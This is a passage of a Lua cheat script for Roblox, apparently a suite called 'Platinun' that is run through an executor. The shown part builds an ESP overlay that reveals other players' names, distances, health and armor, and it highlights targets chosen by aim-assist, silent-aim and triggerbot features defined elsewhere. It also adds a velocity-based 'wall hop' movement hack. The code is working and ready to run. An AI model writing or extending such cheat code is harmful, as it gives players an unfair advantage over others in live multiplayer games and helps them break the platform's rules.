        nameShadow.Position = UDim2.fromOffset(0, 0)
        nameShadow.TextColor3 = Color3.fromRGB(25, 25, 25)
        nameShadow.TextXAlignment = Enum.TextXAlignment.Center
        nameShadow.TextStrokeTransparency = 0
        nameShadow.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        nameShadow.Visible = false -- hide the duplicate; stroke does the outline now
        mcFont(nameShadow, 14)
        nameShadow.Parent = nameHolder

        local name = Instance.new("TextLabel")
        name.Name = "Name"
        name.Size = UDim2.new(1, 0, 1, 0)
        name.TextColor3 = Color3.fromRGB(245, 245, 245)
        name.TextXAlignment = Enum.TextXAlignment.Center
        name.TextStrokeTransparency = 0
        name.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        mcFont(name, 14)
        name.ZIndex = 2
        name.Parent = nameHolder

        local barHolder = Instance.new("Frame")
        barHolder.Name = player.Name .. "_Bars"
        barHolder.BackgroundTransparency = 1
        barHolder.AnchorPoint = Vector2.new(0.5, 0)
        barHolder.Size = UDim2.fromOffset(70, 14)
        barHolder.Visible = false
        barHolder.Parent = screen

        local barScale = Instance.new("UIScale")
        barScale.Scale = 1
        barScale.Parent = barHolder

        local layout = Instance.new("UIListLayout")
        layout.FillDirection = Enum.FillDirection.Vertical
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout.Padding = UDim.new(0, 1)
        layout.Parent = barHolder

        local hp = makeBar()
        hp.row.LayoutOrder = 1
        hp.row.Parent = barHolder
        hp.fill.Parent.BackgroundColor3 = Color3.fromRGB(72, 16, 16)

        local armor = makeBar()
        armor.row.LayoutOrder = 2
        armor.row.Parent = barHolder
        armor.fill.BackgroundColor3 = Color3.fromRGB(170, 190, 210)
        armor.fill.Parent.BackgroundColor3 = Color3.fromRGB(28, 28, 34)

        return {
            nameHolder = nameHolder,
            nameScale = nameScale,
            name = name,
            nameShadow = nameShadow,
            barHolder = barHolder,
            barScale = barScale,
            hp = hp,
            armor = armor,
        }
    end

    local function destroyTag(player)
        local tag = tags[player]
        if tag then
            tag.nameHolder:Destroy()
            tag.barHolder:Destroy()
            tags[player] = nil
        end
    end

    local function ensure(player)
        if player == localPlayer then return end
        if not tags[player] then
            tags[player] = makeTag(player)
        end
        return tags[player]
    end

    local function getChar(player)
        local char = player.Character
        if char and char.Parent then return char end
        local folder = Workspace:FindFirstChild("Players")
        if folder then
            local c = folder:FindFirstChild(player.Name)
            if c then return c end
        end
        return nil
    end

    local function getArmor(char)
        local be = char:FindFirstChild("BodyEffects")
        if not be then return 0, false, false end
        local armor = be:FindFirstChild("Armor")
        local ko = be:FindFirstChild("K.O")
        local dead = be:FindFirstChild("Dead")
        return (armor and armor.Value) or 0, (ko and ko.Value) or false, (dead and dead.Value) or false
    end

    local function distScale(dist)
        local t = math.clamp((dist - NEAR_DIST) / (FAR_DIST - NEAR_DIST), 0, 1)
        t = t * t * (3 - 2 * t)
        return SCALE_NEAR + (SCALE_FAR - SCALE_NEAR) * t
    end

    local function isEspEnabled()
        local cfg = getgenv()['Platinun'] and getgenv()['Platinun']['ESP']
        if not cfg then return true end
        return cfg['Enabled'] ~= false
    end

    -- NEW: should the ESP draw HP/armor bars?
    local function shouldEspShowBars()
        local root = getgenv()['Platinun']
        if not root then return true end
        local showCfg = root['General'] and root['General']['Show Hotkeys']
        if not showCfg then return true end
        local mode = tostring(showCfg['Health/Armor'] or 'Both')
        return (mode == 'ESP' or mode == 'Both')
    end

    for _, player in ipairs(Players:GetPlayers()) do
        ensure(player)
    end

    table.insert(connections, Players.PlayerAdded:Connect(ensure))
    table.insert(connections, Players.PlayerRemoving:Connect(destroyTag))

    local _espLast = 0
    table.insert(connections, RunService.RenderStepped:Connect(function()
        local _t = os.clock()
        if _t - _espLast < 0.033 then return end
        _espLast = _t
        if not screen or not screen.Parent then return end
        local cam = Workspace.CurrentCamera
        if not cam then return end

        local enabled = isEspEnabled()

        for player, tag in pairs(tags) do
            if not enabled then
                tag.nameHolder.Visible = false
                tag.barHolder.Visible = false
            else
                local char = getChar(player)
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                local head = char and char:FindFirstChild("Head")
                local root = char and char:FindFirstChild("HumanoidRootPart")

                if not char or not hum or not head or not root or hum.Health <= 0 then
                    tag.nameHolder.Visible = false
                    tag.barHolder.Visible = false
                else
                    local nameWorld = head.Position + Vector3.new(0, 1.15, 0)
                    local namePos, nameOn = cam:WorldToViewportPoint(nameWorld)

                    local feetWorld = root.Position - Vector3.new(0, 3.0, 0)
                    local feetPos, feetOn = cam:WorldToViewportPoint(feetWorld)

                    local dist = (cam.CFrame.Position - root.Position).Magnitude
                    local sc = distScale(dist)
                    tag.nameScale.Scale = sc
                    tag.barScale.Scale = sc

                    local armor, ko, dead = getArmor(char)
                    local hp = math.clamp(hum.Health, 0, hum.MaxHealth)
                    local ratio = hum.MaxHealth > 0 and hp / hum.MaxHealth or 0

                    local title = player.DisplayName
                    local targeted = (
                        Script.Locals.AimAssistTarget == player
                        or Script.Locals.SilentAimTarget == player
                        or Script.Locals.TriggerbotTarget == player
                    )
                    local espCfg = getgenv()['Platinun'] and getgenv()['Platinun']['ESP']
                    if ko or dead then
                        title = title .. " KO"
                        tag.name.TextColor3 = Color3.fromRGB(220, 70, 70)
                    elseif targeted and espCfg and espCfg['Targeted Color'] then
                        tag.name.TextColor3 = espCfg['Targeted Color']
                    elseif espCfg and espCfg['Normal Color'] then
                        tag.name.TextColor3 = espCfg['Normal Color']
                    else
                        tag.name.TextColor3 = Color3.fromRGB(245, 245, 245)
                    end

                    if espCfg and espCfg['Distance'] and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local d = math.floor((root.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude)
                        title = title .. " [" .. d .. "m]"
                    end

                    local showName = (not espCfg) or (espCfg['Names'] ~= false)
                    tag.name.Text = showName and title or ""
                    tag.nameShadow.Text = showName and title or ""

                    local espBarsOn = shouldEspShowBars()
                    local showHealth = espBarsOn and ((not espCfg) or (espCfg['Health Bar'] ~= false))
                    local showArmor = espBarsOn and ((not espCfg) or (espCfg['Armor Bar'] ~= false))
                    tag.hp.row.Visible = showHealth
                    tag.armor.row.Visible = showArmor

                    if showHealth then
                        setBar(tag.hp, hp, hum.MaxHealth, hpColor(ratio), Color3.fromRGB(72, 16, 16))
                    end
                    if showArmor then
                        setBar(tag.armor, armor, math.max(ARMOR_MAX, armor), Color3.fromRGB(170, 190, 210), Color3.fromRGB(28, 28, 34))
                    end

                    if nameOn and namePos.Z > 0 and showName then
                        tag.nameHolder.Position = UDim2.fromOffset(px(namePos.X), px(namePos.Y))
                        tag.nameHolder.Visible = true
                    else
                        tag.nameHolder.Visible = false
                    end

                    if feetOn and feetPos.Z > 0 and (showHealth or showArmor) then
                        tag.barHolder.Position = UDim2.fromOffset(px(feetPos.X), px(feetPos.Y))
                        tag.barHolder.Visible = true
                    else
                        tag.barHolder.Visible = false
                    end
                end
            end
        end
    end))

    getgenv().PixelNametagESP_Cleanup = function()
        for _, c in ipairs(connections) do
            pcall(function() c:Disconnect() end)
        end
        for player in pairs(tags) do
            destroyTag(player)
        end
        if screen then screen:Destroy() end
    end
end

-- ==================== WALL HOP SYSTEM (REBUILT) ====================

local WallHopEnabled = getgenv()['Platinun']['Player Modifications']['Wall Hop']

local WallHopPlatinun = {
    TouchDistance       = 2.6,
    WallJumpUpBoost     = 55,
    WallJumpAwayBoost   = 28,
    WallNormalThreshold = 0.55,
    CooldownTime        = 0.18,
}

local canWallHop = true
local isTouchingWallHop = false
local currentWallHopNormal = nil
local lastWallHopTime = 0

local function getCharacter()
    local char = Self.Character
    if not char then return nil, nil, nil end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    return char, hum, root
end

local hopRayParams = RaycastParams.new()
hopRayParams.FilterType = Enum.RaycastFilterType.Exclude
hopRayParams.IgnoreWater = true

local function checkForWallHop()
    local char, hum, root = getCharacter()
    if not root then return false, nil end

    hopRayParams.FilterDescendantsInstances = {char}
    local origin = root.Position + Vector3.new(0, 1.2, 0) -- chest height

    local dirs = {
        Vector3.new(1, 0, 0), Vector3.new(-1, 0, 0),
        Vector3.new(0, 0, 1), Vector3.new(0, 0, -1),
        Vector3.new(0.707, 0, 0.707), Vector3.new(-0.707, 0, 0.707),
        Vector3.new(0.707, 0, -0.707), Vector3.new(-0.707, 0, -0.707),
        Vector3.new(0.5, 0.25, 0), Vector3.new(-0.5, 0.25, 0),
        Vector3.new(0, 0.25, 0.5), Vector3.new(0, 0.25, -0.5),
        Vector3.new(0.5, -0.2, 0), Vector3.new(-0.5, -0.2, 0),
        Vector3.new(0, -0.2, 0.5), Vector3.new(0, -0.2, -0.5),
    }

    for _, d in ipairs(dirs) do
        local result = workspace:Raycast(origin, d.Unit * WallHopPlatinun.TouchDistance, hopRayParams)
        if result then
            local normal = result.Normal
            if math.abs(normal.Y) < WallHopPlatinun.WallNormalThreshold then
                return true, normal
            end
        end
    end
    return false, nil
end

local function performWallHop()
    if not WallHopEnabled then return end
    if not canWallHop then return end

    -- live re-check so we don't depend on stale Heartbeat state
    local touching, normal = checkForWallHop()
    if not touching or not normal then return end

    local char, hum, root = getCharacter()
    if not hum or not root or hum.Health <= 0 then return end

    local state = hum:GetState()
    if state == Enum.HumanoidStateType.Dead or state == Enum.HumanoidStateType.Climbing then
        return
    end

    if (tick() - lastWallHopTime) < WallHopPlatinun.CooldownTime then return end

    local awayDir = Vector3.new(normal.X, 0, normal.Z)
    if awayDir.Magnitude > 0.05 then
        awayDir = awayDir.Unit
    else
        awayDir = -root.CFrame.LookVector
        awayDir = Vector3.new(awayDir.X, 0, awayDir.Z)
        if awayDir.Magnitude > 0.05 then awayDir = awayDir.Unit else awayDir = Vector3.new(0, 0, -1) end
    end

    local currentVel = root.AssemblyLinearVelocity
    root.AssemblyLinearVelocity = Vector3.new(
        currentVel.X + awayDir.X * WallHopPlatinun.WallJumpAwayBoost,
        WallHopPlatinun.WallJumpUpBoost,
        currentVel.Z + awayDir.Z * WallHopPlatinun.WallJumpAwayBoost
    )

    -- help the humanoid accept the hop
    pcall(function()
        hum:ChangeState(Enum.HumanoidStateType.Jumping)
    end)

    canWallHop = false
    lastWallHopTime = tick()
    isTouchingWallHop = true
    currentWallHopNormal = normal

    task.delay(WallHopPlatinun.CooldownTime, function()
        canWallHop = true
    end)
end

-- Space + JumpRequest (covers more executors)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Space then
        performWallHop()
    end
end)

pcall(function()
    UserInputService.JumpRequest:Connect(function()
        performWallHop()
    end)
end)

-- continuous wall detection
local _wallLastCheck = 0
RunService.Heartbeat:Connect(function()
    if not WallHopEnabled then
        isTouchingWallHop = false
        return
    end
    local now = os.clock()
    if now - _wallLastCheck < 0.05 then return end
    _wallLastCheck = now

    local char, hum, root = getCharacter()
    if not char or not hum or hum.Health <= 0 then
        isTouchingWallHop = false
        return
    end

    local touching, normal = checkForWallHop()
    isTouchingWallHop = touching
    if touching then
        currentWallHopNormal = normal
    end
end)

Self.CharacterAdded:Connect(function()
    task.wait(0.3)
    canWallHop = true
    isTouchingWallHop = false
    currentWallHopNormal = nil
    lastWallHopTime = 0
end)
